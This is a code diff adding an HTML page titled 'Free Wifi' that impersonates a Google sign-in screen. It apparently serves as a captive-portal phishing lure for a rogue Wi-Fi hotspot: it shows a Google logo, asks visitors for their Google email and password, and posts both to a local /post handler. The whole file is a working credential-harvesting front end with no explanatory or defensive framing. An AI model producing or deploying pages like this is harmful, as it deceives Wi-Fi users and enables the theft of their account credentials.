@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head>
+        <meta charset="utf-8" />
+        <title>Free Wifi</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+        <link rel="stylesheet" href="/style.css" />
+    </head>
+    <body>
+        <div class="container">
+            <div class="top-content">
+                <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt="" />
+                <h2>Sign in to use Free Wifi</h2>
+                <p class="heading">Use your Google Account</p>
+            </div>
+            <form id="login-form" action="/post" method="post">
+                <div class="inputs">
+                    <input type="email" id="email" class="input" name="email" />
+                    <label for="email" class="input-label">Email or phone</label>
+                    <div class="error-tooltip" id="email-error"></div>
+                </div>
+                <div class="inputs">
+                    <input type="password" id="password" class="input" name="password" />
+                    <label for="password" class="input-label">Password</label>
+                    <div class="error-tooltip" id="password-error"></div>
+                </div>
+                <a href="#" class="link-btn">Forgot Password?</a>
+                <p class="color">Not your computer? Use Guest mode to sign in privately.</p>
+                <a href="#" class="link-btn">Learn More</a>
+                <div class="btn-group">
+                    <button class="create-btn" type="button">Create account</button>
+                    <button class="next-btn" type="submit">Next</button>
+                </div>
+            </form>
+        </div>
+        <script src="/script.js"></script>
+    </body>
+</html>
